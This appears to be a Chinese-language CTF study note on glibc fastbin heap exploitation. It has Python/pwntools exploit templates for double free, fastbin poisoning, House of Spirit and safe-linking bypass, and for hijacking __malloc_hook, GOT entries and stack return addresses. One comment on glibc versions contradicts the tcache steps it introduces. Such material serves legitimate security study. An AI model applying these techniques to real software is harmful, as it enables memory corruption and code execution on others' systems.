# Fastbin 攻击

## 原理

glibc 的 fastbin 用于管理小块内存（0x20-0x80，64位），采用单链表 LIFO 结构，安全检查较弱。攻击者通过 UAF/Double Free 修改 fastbin 的 fd 指针，实现任意地址分配。

## Fastbin 特点

- 大小范围：0x20-0x80（64位），步长 0x10
- 单链表，LIFO
- 无合并
- size 检查（glibc 2.0+）
- 对齐检查（glibc 2.32+ safe-linking）

## 攻击链

### 1. Fastbin Double Free

```python
from pwn import *

p = process('./pwn')

# glibc < 2.26 或 tcache 满后
# 1. 分配 7 个 + 2 个
for i in range(7):
    malloc(0x70)  # idx 0-6
malloc(0x70)  # idx 7
malloc(0x70)  # idx 8
malloc(0x20)  # idx 9，防止合并
# 2. 释放 7 个填满 tcache
for i in range(7):
    free(i)
# 3. 释放 idx 7 和 idx 8，再释放 idx 7（double free）
free(7)
free(8)
free(7)  # double free
# fastbin: idx7 -> idx8 -> idx7 -> ...
# 4. 分配 7 个清空 tcache
for i in range(7):
    malloc(0x70)
# 5. 分配得到 idx7，修改 fd
malloc(0x70)  # idx 10，返回 idx7
edit(10, p64(target_addr))
# 6. 分配得到 idx8
malloc(0x70)  # idx 11，返回 idx8
# 7. 分配得到 target_addr
malloc(0x70)  # idx 12，返回 target_addr
```

### 2. Fastbin Poisoning

```python
# 1. 分配 7 个 + 1 个
for i in range(7):
    malloc(0x70)  # idx 0-6
malloc(0x70)  # idx 7
malloc(0x20)  # idx 8，防止合并
# 2. 释放 7 个填满 tcache
for i in range(7):
    free(i)
# 3. 释放 idx 7，进入 fastbin
free(7)
# 4. UAF 修改 fd
edit(7, p64(target_addr))
# 5. 分配 7 个清空 tcache
for i in range(7):
    malloc(0x70)
# 6. 分配得到 target_addr
malloc(0x70)  # 返回 fastbin 中的块
malloc(0x70)  # 返回 target_addr
```

### 3. 伪造 chunk size

```python
# fastbin 分配时会检查 size 是否匹配
# target_addr 处需要有合法的 size

# 例如：分配 0x70 的 chunk
# target_addr 处需要有 0x7X 的值（X 任意）
# 常见伪造点：
# 1. __malloc_hook - 0x23（0x7f）
# 2. GOT 表附近
# 3. 栈上伪造
```

### 4. House of Spirit

```python
# 在栈/BSS 上伪造 chunk
# 1. 在目标地址伪造 chunk 元数据
#    target_addr: prev_size(8) + size(8) + data
# 2. free 该地址
# 3. malloc 返回该地址

# 伪造
target = 0x404100
# 写入 size
write(target + 8, p64(0x31))  # size = 0x31
# free
free(target + 0x10)  # free chunk 起始地址
# malloc
malloc(0x20)  # 返回 target + 0x10
```

### 5. Safe-Linking 绕过 (glibc 2.32+)

```python
# glibc 2.32+ 引入 safe-linking
# fd 指针加密：ptr = (chunk_addr >> 12) ^ next_ptr
# 需要知道堆地址才能伪造

# 1. 泄露堆地址
# 2. 构造加密的 fd
target = 0x404000
chunk_addr = heap_addr + offset
encrypted = (chunk_addr >> 12) ^ target
edit(idx, p64(encrypted))
```

## 利用场景

### 1. 覆盖 __malloc_hook

```python
# glibc < 2.34
# 利用 __malloc_hook - 0x23 处的 0x7f 作为 size
target = libc.symbols['__malloc_hook'] - 0x23
# fastbin poisoning 分配到 target
# 然后覆盖 __malloc_hook
edit(idx, b'A' * 0x13 + p64(one_gadget))
```

### 2. 覆盖 __free_hook

```python
# glibc < 2.34
# 类似 __malloc_hook
target = libc.symbols['__free_hook'] - 0x?  # 找合适的 size
```

### 3. 覆盖 GOT 表

```python
# Partial RELRO
# 在 GOT 表附近找合适的 size
```

### 4. 分配到栈上

```python
# 1. 泄露栈地址
# 2. 在栈上伪造 chunk size
# 3. fastbin poisoning 分配到栈上
# 4. 覆盖返回地址
```

### 5. 分配到 BSS

```python
# 在 BSS 上伪造 chunk
# 分配到 BSS
# 覆盖全局变量
```

## 2024-2026 新技术点

### 1. glibc 2.34+ 无 hooks

```python
# 传统 __malloc_hook/__free_hook 失效
# 新利用方法：
# 1. IO_FILE 攻击（House of Apple 系列）
# 2. exit_funcs 利用
# 3. TLS 劫持
```

### 2. safe-linking

```python
# glibc 2.32+
# fastbin 指针加密
# 需要泄露堆地址
```

### 3. House of Apple 系列

```python
# House of Apple 2/3
# 针对 glibc 2.34+
# 通过 fastbin + IO_FILE 实现 RCE
```

### 4. House of Cat

```python
# 2024 年新利用链
# 针对 glibc 2.35+
```

### 5. 硬件级防护

```python
# Intel CET
# ARM PAC/BTI
# MTE (Memory Tagging Extension)
# 影响 fastbin 利用
```

### 6. 沙箱环境

```python
# seccomp 限制
# 通过 ORW (open/read/write) 绕过
```

## 工具推荐

- **pwntools** — Python 利用框架
- **gdb + pwndbg** — 动态调试（fastbins 命令）
- **heap-viewer** — 堆可视化

## 参考链接

- [ctf-wiki fastbin](https://ctf-wiki.org/pwn/linux/glibc-heap/fastbin_attack/)
- [how2heap fastbin](https://github.com/shellphish/how2heap)
- [Fastbin Attack](https://www.jianshu.com/p/4d7d7a460c0c)
